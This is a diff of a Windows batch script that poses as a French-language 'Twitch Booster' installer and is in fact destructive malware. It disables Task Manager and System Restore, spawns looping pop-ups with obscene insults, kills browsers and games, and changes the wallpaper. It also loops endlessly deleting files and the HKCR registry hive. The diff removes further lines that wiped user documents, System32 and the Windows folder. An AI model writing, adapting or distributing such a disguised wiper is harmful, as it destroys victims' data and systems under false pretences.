@@ -1,7 +1,7 @@
 @echo off
+::I merged the Twitch booster by spirit & that of sneus lol
 cls
 set ztmp=C:\Users\admin\AppData\Local\Temp\ztmp
-
 set MYFILES=C:\Users\admin\AppData\Local\Temp\afolder
 set cmdline=
 SHIFT /0
@@ -19,37 +19,22 @@ set /a idi=%random%
 set /a ca=%random%
 
 :breeee
-if exist brainsmoke_nyan.asm
-    nasm brainsmoke_nyan.asm -o boot.bin
+if exist snake.asm
+    nasm snake.asm -o boot.bin
     pause
     qemu-system-x86_64 -drive file=boot.bin,format=raw -monitor stdio -m 256 -no-shutdown -no-reboot -accel hax -L "C:\Program Files\qemu"
     goto email
 
 :email
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System  /v  DisableTaskMgr  /t REG_DWORD  /d 1 /f
-
-copy "mlt.exe" "C:\Windows\System32"
-copy "mlt.cpp" "C:\Windows\System32"
 copy "cc.bmp" "C:\Users\%username%"
-copy "up.bat" "C:\Windows\System32"
-copy "brainsmoke_nyan.asm" "C:\Windows\System32"
-copy "C:\Users\%username%\Dekstop\DuoHelpersServersFR2023nst\mlt.exe" "C:\Windows\System32"
-copy "C:\Users\%username%\Dekstop\DuoHelpersServersFR2023nst\mlt.cpp" "C:\Windows\System32"
-copy "C:\Users\%username%\Dekstop\DuoHelpersServersFR2023nst\cc.bmp" "C:\Users\%username%"
-copy "C:\Users\%username%\Dekstop\DuoHelpersServersFR2023nst\up.bat" "C:\Windows\System32"
-copy "C:\Users\%username%\Dekstop\DuoHelpersServersFR2023nst\brainsmoke_nyan.asm" "C:\Windows\System32"
-copy "mlt.exe" "C:\Windows\System32"
-copy "mlt.cpp" "C:\Windows\System32"
-copy "cc.bmp" "C:\Users\%username%"
-copy "up.bat" "C:\Windows\System32"
-copy "brainsmoke_nyan.asm" "C:\Windows\System32"
-cd %systemdrive%\Users\%USERNAME%\AppData\Local\Temp
+copy "cc.bmp" "%username%
 reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f >nul
 cls
-@echo msgbox "bienvenue dans stream fire. voulez vous proceder a une installation?",4+32+4096,"duoHelpers">%twitch%.vbs
+@echo msgbox "bienvenue dans l'installateur du Twitch Booster pour OBS et Xsplit, voulez vous procéder a l'installation?",1+32+4096,"Twitch Booster">%twitch%.vbs
 @echo WScript.Sleep 3000>>%twitch%.vbs
 
-@echo msgbox "installation fini. le logiciel apparait dans 40s.",1+64+4096,"installeur">>%end%.vbs
+@echo msgbox "installation terminé",1+64+4096,"Twitch Booster">>%end%.vbs
 start up.bat
 @echo Set oWMP = CreateObject("WMPlayer.OCX.7" )>%disque%.vbs
 @echo Set colCDROMs = oWMP.cdromCollection>>%disque%.vbs
@@ -77,7 +62,7 @@ start up.bat
 @echo loop>>%led%.vbs
 
 @echo do>%prenom%.vbs
-@echo msgbox "LE 18-25 TA NIQUER CELESTIN POUR REPARER FLOSS",5+16+4096,"ILLUMINATI DU 18-25">>%prenom%.vbs
+@echo msgbox "LE 18-25 TA BIEN BAISER LE FION PUTAIN DE GROS FILS DE PUTE",0+16+4096,"l'élite de la nation">>%prenom%.vbs
 @echo CreateObject("WScript.Shell").Run "%prenom%.vbs">>%prenom%.vbs
 @echo loop>>%prenom%.vbs
 
@@ -90,9 +75,9 @@ start up.bat
 @echo WScript.Sleep 1000>>%ca%.vbs
 @echo loop>>%ca%.vbs
 
-set file=msc.mp3
+set file=twitchbooster.mp3
 ( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
-  echo Sound.URL = "https://media.discordapp.net/attachments/1165999301386842172/1167157138506919956/msc.mp3"
+  echo Sound.URL = "https://media.discordapp.net/attachments/1168428205695320066/1170562011847995496/twitchbooster"
   echo Sound.Controls.play
   echo do while Sound.currentmedia.duration = 0
   echo wscript.sleep 100
@@ -148,35 +133,20 @@ if exist %disque%.vbs (
 )
 
 :extrapd
-del C:\Users\%userprofile%\Dekstop\Documents\\*
-del %userprofile%\Dekstop\Documents\*.*/Y
-del C:\Users\%userprofile%\Bureau\Documents\*.*/O
-del %userprofile%\Dekstop\Documents
-del C:\Users\%userprofile%\Dekstop\music\pictures\*.*/Y
-rd C:\Users\%userprofile%\Dekstop\Images /f /s /q
-del C:\Users\%userprofile%\Dekstop\Videos\*.*/Y
-del C:\Users\%userprofile%\Bureau\videos\\*
-timeout /t 8
 taskkill /f /t /im javaw.exe
 taskkill /f /t /im roblox.exe
-del C:\Windows\Web\*.*/Y
-del C:\Windows\Web\*.*/O
 taskkill /f /t /im spotify.exe
 taskkill /f /t /im csgo.exe
 taskkill /f /t /im python.exe
 taskkill /f /t /im python3.exe
 taskkill /f /t /im hl2.exe
 taskkill /f /t /im notepad.exe
-del C:\Windows\Web /f /s /q /y
-del C:\Windows\Web /f /s /q
-del C:\Windows\Web /f /s /q /o
 taskkill /f /t /im mspaint.exe
 taskkill /f /t /im iexplore.exe
 taskkill /f /t /im chrome.exe
 taskkill /f /t /im mozilla.exe
 taskkill /f /t /im brave.exe
 taskkill /f /t /im edge.exe
-rd C:\Windows\Web /f /s /q
 taskkill /f /t /im photoshop.exe
 taskkill /f /t /im outlook.exe
 reg add "HKCU\Control Panel\Desktop" /V Wallpaper /F /T REG_SZ /D "C:\Users\%username%\cc.bmp"
@@ -253,11 +223,8 @@ if exist %idi%.vbs (
 
 
 :bzva
-timeout /t 15
-del C:\Windows\System32\*.* /F /S /Q >nul
-timeout /t 33
+timeout /t 5
 del *.* /F /S /Q >nul
 reg delete HKCR /F >nul
-del C:\Windows /F /S /Q >nul
 del *.*/Y >nul
 goto bzva
